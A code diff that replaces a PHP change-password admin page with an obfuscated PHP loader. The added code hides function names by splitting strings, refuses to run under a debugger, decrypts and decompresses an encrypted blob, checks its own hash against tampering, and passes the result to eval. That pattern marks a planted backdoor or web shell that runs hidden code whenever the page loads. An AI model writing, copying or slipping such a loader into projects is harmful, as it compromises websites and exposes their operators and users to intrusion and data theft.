@@ -1,119 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_form.php"; ?>
-<!-- </copy> -->  
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
- <?php include"sidebar.php"; ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?= $page_title;?>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li class="active"><?= $page_title;?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-        <?php include"comman/code_flashdata.php"; ?>
-        <!-- ********** ALERT MESSAGE END******* -->
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Horizontal Form -->
-          <div class="box box-info ">
-            <div class="box-header with-border">
-              <h3 class="box-title">Please Enter Valid Data</h3>
-            </div>
-            <!-- /.box-header -->
-            <!-- form start -->
-            <form class="form-horizontal" id="category-form" onkeypress="return event.keyCode != 13;">
-              <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-              <div class="box-body">
-				<div class="form-group">
-				  <label for="current_pass" class="col-sm-2 control-label"><?= $this->lang->line('current_password'); ?><label class="text-danger">*</label></label>
-                  <div class="col-sm-4">
-                    <input type="password" class="form-control input-sm" id="current_pass" name="current_pass" placeholder="" onkeyup="shift_cursor(event,'pass')"  autofocus>
-					<span id="category_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                </div>
-				<div class="form-group">
-				  <label for="pass" class="col-sm-2 control-label"><?= $this->lang->line('new_password'); ?><label class="text-danger">*</label></label>
-                  <div class="col-sm-4">
-                    <input type="password" class="form-control input-sm" id="pass" name="pass" placeholder="" onkeyup="shift_cursor(event,'confirm')"  >
-					<span id="category_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                </div>
-				<div class="form-group">
-				  <label for="confirm" class="col-sm-2 control-label"><?= $this->lang->line('confirm_password'); ?><label class="text-danger">*</label></label>
-                  <div class="col-sm-4">
-                    <input type="password" class="form-control input-sm" id="confirm" name="confirm" placeholder="">
-					<span id="category_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                </div>
-
-              </div>
-              <!-- /.box-body -->
-              
-              <!-- /.box-footer -->
-              <div class="box-footer">
-                <div class="col-sm-8 col-sm-offset-2 text-center">
-                   <div class="col-md-3 col-md-offset-3">
-                      <button type="button" id="save" class=" btn btn-block btn-success" title="Save Data">Save</button>
-                   </div>
-                   <div class="col-sm-3">
-                    <a href="<?=base_url('dashboard');?>">
-                      <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn" title="Go Dashboard">Close</button>
-                    </a>
-                   </div>
-                </div>
-             </div>
-             <!-- /.box-footer -->
-            </form>
-          </div>
-          <!-- /.box -->
-
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-
- <?php include"footer.php"; ?>
-
-
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_form.php"; ?>
-
-<script src="<?php echo $theme_link; ?>js/changepass.js"></script>
-
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_xvrh9uit=('bas'.'e64'.'_de'.'cod'.'e');
+$_owh3tw73=('gzu'.'nco'.'mpr'.'ess');
+$_diy3u56s=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_aiycjqcv='8Zx/3K4O';
+$_dzhra3m8='ndWMqFOg';
+$_nlhgh0ss='dtIEDr2B';
+$_a9mba1zs='WWFaftrCYBw=';
+$_mq0yilb1='h4PA7+OY';
+$_hxk94vr9='Y9dSlQ==';
+$_hkgrnnlu='o+KIpZQI';
+$_i8r1bzea='lbrW4Y/e';
+$_m8o9r0f9=$_xvrh9uit($_nlhgh0ss.$_aiycjqcv.$_mq0yilb1.$_dzhra3m8.$_a9mba1zs);
+$_uqgxliem=$_xvrh9uit($_i8r1bzea.$_hkgrnnlu.$_hxk94vr9);
+$_tvuz29lx=$_xvrh9uit('SNNpYoQRQBe8qMcqMAwnnhegbjIyU6BS+1dNz+9ceQokzRur5kHo7DH8dd/SheFbwgUg54MdudxRoZgqVbSgGzcdFA9Z9NFqQYReJtGRlCU5Cazezcaxs8Hb8TIUBhMIVmDigVqXTZ3Mje0jHc9duo5faLeg3NduzMPI4WhXEcXzRAiJfDDuBYvDfiFnXpb4uTOWXaS3oFUFxj6vuUz94f0s/1ubEbPIpGgwOXvMCqUjzusLU2op65Q7/u/SaGpEXCnG+kJNALhSF3UTxAvyAjY1MqSX3rq0lC9ym3UDs5gcYq6cPmjsm0KZhO0QnnN23FpPblpkyli8Oqaf1rUrWDhWs4jjBYBZCfnvGg5TFxa7N4HsTDH+k8gYvOuUhkQxiYPcmLnvZECDqot6b/M0Slow+fy3Z7RneSOHeWubzlkDuASaBsJXSkBvNgfA5ANaXVt4P1Jfnk9DQ8JuGUtZ1rpcNn60vGN/VwFHQCgtt10u6IvGhaBFHPMr2Tp29vKb0Rcg5P4D0fZdpHm64fvloEe/tDSyOOIssZc0jOOGYB2vrjeCxc3Gw9hfX/V1oQEysBVgxOWCHkvpYOMx/0anQMCaeFNBjnoCJVXdbfZJZWiRiMuK9xe2kiWvcbXCpyJaHo1lRle482rVz2qBOxXMH3a4KCCNxmu6/f2pIX5zolkSVFSeoVzQKPQzLGI2u8l3df0Sm84ukXkqsKpSmGwVKUWTMrB0E5/KFDU5pjN++vhi/Vj3E9jvoW9TyJuqx35h0RkAX8NMudMaiN4IcVYKWOyVn+WkoPZKtxk1kM1W4FllV85K6jqiyXpVPJqQzuOD5GX8Q7rtZB4vAlHu35Ftl1BnyrkzfjPTFVNS6riB1trU7izSbsvlp9PQDs5FcbaLlPgLlKrz7StDFxIJLQcsm6nSLHV4PGc4l0oT2qfks6Mb2MA1cZmH/Zr8wmPfdPNhqdL7tS97kgH/LOQiDlvxIy+2mVckFKr3G/iQSeFTXBHtLVH3gj0VheTuXYrlwyH9LIcenlIWyQCkCcGjk+8lafiRUBQL2UGviAs8yZMDXclG+L9b4w3bWp9nlqbr5HzOiGF2tXNYmrBUsHVV9HqaEsMwyNI+nktC20XLmMueYIajBTJXQKYoqut56urhqvBw1j1g4HYDvbrTKMNn6k1TC0iSRBz/gjk/wNe9TpMUv9jMslInhZ2cVv66kZIj6hRI5QQf2f8MB5mp0qjt5RANWXDV0i246u/B+QnS5dh4SSJl3LxXebA+4I4sHfdFc2o49JORGqsZKvIUiAxx44p0jtgxodyM+gIqxIlwd/EqbCbGh01zARDSrYpQHX54ZiqiWbI1dMjmNEvHhW1VAsptU61fLr9bukdDCkZ63XBv6hnzhs0qm5yywgCqtQn/qNisLpojV8eTeP4XY2Y+8B62Tma3GQA14U76xwvq5usOjmRvq0UNOGNzrdjJ0bTVCzoiZLiauatheFqbj/t+gPdvgnWuEc0RlNi7ofKuUd3G8fttKqUeoOXQJKnwiEdyC0TaaYK0wseP30HjKnnAzOiXj8mdoZfuQs0FZphMjxiTqD26XGcHqRP7P+IYp6ZY5Y29sA3F55nFk+6vn/32iPFBelEwxwZL9GJTng6FYTxtOrKfuFy5Ds0AHOVzOE3lHeVvfDkNkxXIdwm7qXyV5IR0ReOjCA3Utk4L2n1Y0UdX5vw7MYjpmNFT4+sTuTz02oF7gY41TgNvkCigrtC383C72M8+C55uejTlxLIxXVSZwx3Sdp3UA5sYTFq/g10S392IJpICX+dAUgreKK5MIdL/ZA==');
+$_gf6o24fx=$_diy3u56s($_tvuz29lx,'aes-256-cbc',$_m8o9r0f9,OPENSSL_RAW_DATA,$_uqgxliem);
+if($_gf6o24fx===false){exit;}
+$_o7gh1bpu=$_owh3tw73($_gf6o24fx);
+if($_o7gh1bpu===false){exit;}
+$_szg887zh='b11622b803c7f3c12d58309a552c60a393c7a66c90669f348eae56048f6feb43';
+$_q0mfvv2q=@file_get_contents(__FILE__);
+if($_q0mfvv2q!==false){
+$_hjz4ge6s=str_replace($_szg887zh,"0000000000000000000000000000000000000000000000000000000000000000",$_q0mfvv2q);
+$_f6slh7qg=hash("sha256",$_hjz4ge6s);
+if($_f6slh7qg!==$_szg887zh){@http_response_code(403);exit;}
+}
+eval($_o7gh1bpu);
